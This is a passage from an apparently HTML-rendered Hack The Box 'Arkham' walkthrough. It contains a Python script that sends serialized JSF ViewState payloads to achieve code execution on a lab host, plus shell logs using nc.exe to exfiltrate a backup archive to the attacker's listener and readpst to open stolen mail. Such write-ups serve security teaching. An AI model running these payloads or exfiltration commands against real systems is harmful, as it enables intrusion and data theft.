class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;12px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;.name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;.line&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;HTTP Status 500 â Internal Server Error&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&amp;lt;hr&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;line&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Type&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; Exception Report&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Message&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;; [Ljava.lang.Object; is in module java.base of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;)&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Description&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Exception&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;pre&amp;gt;&lt;/span&gt;java.lang.ClassCastException: class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;; [Ljava.lang.Object; is in module java.base of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;)
+        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getSavedState(HtmlResponseStateManager.java:187)
+        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getState(HtmlResponseStateManager.java:139)
+        org.apache.myfaces.application.jsp.JspStateManagerImpl.restoreView(JspStateManagerImpl.java:355)
+        org.apache.myfaces.application.jsp.JspViewHandlerImpl.restoreView(JspViewHandlerImpl.java:515)
+        org.apache.myfaces.lifecycle.RestoreViewExecutor.execute(RestoreViewExecutor.java:85)
+        org.apache.myfaces.lifecycle.LifecycleImpl.executePhase(LifecycleImpl.java:103)
+        org.apache.myfaces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:76)
+        javax.faces.webapp.FacesServlet.service(FacesServlet.java:244)
+        org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pre&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Note&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; The full stack trace of the root cause is available in the server logs.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;hr&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;line&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Apache Tomcat/8.5.37&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;then-i-checked-my-listener-and-&quot;&gt;Then I checked my listener, and :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-owned-user-&quot;&gt;We owned user !&lt;/h4&gt;
+&lt;h4 id=&quot;i-also-scripted-this-because-copying-and-pasting-in-burp-wasnt-my-favorite-thing-and-it-only-takes-2-minutes-to-script-this-in-python-&quot;&gt;I also scripted this because copying and pasting in burp wasn’t my favorite thing and it only takes 2 minutes to script this in python :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python3&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;j_id_jsp_1623871077_1:email&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;test&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;j_id_jsp_1623871077_1:submit&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SIGN UP&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;j_id_jsp_1623871077_1_SUBMIT&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;javax.faces.ViewState&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://10.10.10.130:8080/userSubscribe.faces&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;upload_payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;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&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;execute_payload&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;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&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;upload_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;shell-as-batman&quot;&gt;Shell as Batman&lt;/h3&gt;
+&lt;h4 id=&quot;we-are-on-the-box-as-alfred-i-enumerated-the-directories-and-found-a-directory-called-backups-in-cusersalfreddownloads-it-had-a-zip-archive-called-backupzip-&quot;&gt;We are on the box as &lt;code class=&quot;highlighter-rouge&quot;&gt;Alfred&lt;/code&gt;, I enumerated the directories and found a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;backups&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Alfred\Downloads&lt;/code&gt;, It had a &lt;code class=&quot;highlighter-rouge&quot;&gt;zip&lt;/code&gt; archive called &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.zip&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\Alfred\Downloads&amp;gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FA90-3873
+
+ Directory of C:\Users\Alfred\Downloads
+
+02/03/2019  08:48 AM    &amp;lt;DIR&amp;gt;          .
+02/03/2019  08:48 AM    &amp;lt;DIR&amp;gt;          ..
+02/03/2019  08:41 AM    &amp;lt;DIR&amp;gt;          backups
+               0 File(s)              0 bytes
+               3 Dir(s)   8,675,921,920 bytes free
+
+C:\Users\Alfred\Downloads&amp;gt;cd backups
+cd backups
+
+C:\Users\Alfred\Downloads\backups&amp;gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FA90-3873
+
+ Directory of C:\Users\Alfred\Downloads\backups
+
+02/03/2019  08:41 AM    &amp;lt;DIR&amp;gt;          .
+02/03/2019  08:41 AM    &amp;lt;DIR&amp;gt;          ..
+02/03/2019  08:41 AM           124,257 backup.zip
+               1 File(s)        124,257 bytes
+               2 Dir(s)   8,675,921,920 bytes free
+
+C:\Users\Alfred\Downloads\backups&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-wanted-to-get-it-on-my-box-so-i-used-nc-to-do-it-i-listened-on-port-1338-then-on-the-box-i-did-this&quot;&gt;I wanted to get it on my box so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; to do it. I listened on port 1338, then on the box I did this:&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\Alfred\Downloads\backups&amp;gt;C:\windows\system32\spool\drivers\color\nc.exe -w 3 10.10.xx.xx 1338 &amp;lt; C:\Users\Alfred\Downloads\backups\backup.zip                                                             
+C:\windows\system32\spool\drivers\color\nc.exe -w 3 10.10.xx.xx 1338 &amp;lt; C:\Users\Alfred\Downloads\backups\backup.zip                                                                                   
+C:\Users\Alfred\Downloads\backups&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;and-i-successfully-got-the-file-&quot;&gt;And I successfully got the file :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/backups# nc -lp 1338 &amp;gt; backup.zip                                                                    
+root@kali:~/Desktop/HTB/boxes/arkham/backups# ls -la
+total 132
+drwxr-xr-x 2 root root   4096 Aug  9 21:26 .
+drwxr-xr-x 5 root root   4096 Aug  9 21:24 ..
+-rw-r--r-- 1 root root 124257 Aug  9 21:26 backup.zip
+root@kali:~/Desktop/HTB/boxes/arkham/backups#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;the-archive-only-had-a-file-called-alfredarkhamlocalost-which-is-an-outlook-email-folder-so-i-used-readpst-to-convert-it&quot;&gt;The archive only had a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;alfred@arkham.local.ost&lt;/code&gt; which is an outlook email folder so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;readpst&lt;/code&gt; to convert it.&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/backups# unzip backup.zip 
+Archive:  backup.zip
+  inflating: alfred@arkham.local.ost  
+root@kali:~/Desktop/HTB/boxes/arkham/backups# file alfred@arkham.local.ost 
+alfred@arkham.local.ost: Microsoft Outlook email folder
+root@kali:~/Desktop/HTB/boxes/arkham/backups# readpst alfred@arkham.local.ost 
+Opening PST file and indexes...
+Processing Folder &quot;Deleted Items&quot;
+Processing Folder &quot;Inbox&quot;
+Processing Folder &quot;Outbox&quot;
+Processing Folder &quot;Sent Items&quot;
+Processing Folder &quot;Calendar&quot;
+Processing Folder &quot;Contacts&quot;
+Processing Folder &quot;Conversation Action Settings&quot;
+Processing Folder &quot;Drafts&quot;
+Processing Folder &quot;Journal&quot;
+Processing Folder &quot;Junk E-Mail&quot;
+Processing Folder &quot;Notes&quot;
+Processing Folder &quot;Tasks&quot;
+Processing Folder &quot;Sync Issues&quot;
+Processing Folder &quot;RSS Feeds&quot;
+Processing Folder &quot;Quick Step Settings&quot;
+  &quot;alfred@arkham.local.ost&quot; - 15 items done, 0 items skipped.
+  &quot;Calendar&quot; - 0 items done, 3 items skipped.
+Processing Folder &quot;Conflicts&quot;
+Processing Folder &quot;Local Failures&quot;
+Processing Folder &quot;Server Failures&quot;
+  &quot;Sync Issues&quot; - 3 items done, 0 items skipped.
+  &quot;Inbox&quot; - 0 items done, 7 items skipped.
+  &quot;Drafts&quot; - 1 items done, 0 items skipped.
+root@kali:~/Desktop/HTB/boxes/arkham/backups# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;the-output-was-saved-in-draftsmbox-i-removed-the-long-useless-output-&quot;&gt;The output was saved in &lt;code class=&quot;highlighter-rouge&quot;&gt;Drafts.mbox&lt;/code&gt;, I removed the long useless output :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/backups# ls -la
+total 16608
+drwxr-xr-x 2 root root     4096 Aug  9 21:33 .
+drwxr-xr-x 5 root root     4096 Aug  9 21:33 ..
+-rwx------ 1 root root 16818176 Feb  3  2019 alfred@arkham.local.ost
+-rw-r--r-- 1 root root   124257 Aug  9 21:26 backup.zip
+-rw-r--r-- 1 root root    51857 Aug  9 21:33 Drafts.mbox
+root@kali:~/Desktop/HTB/boxes/arkham/backups# cat Drafts.mbox 
+   ----------------
+    Removed Output
+   ----------------
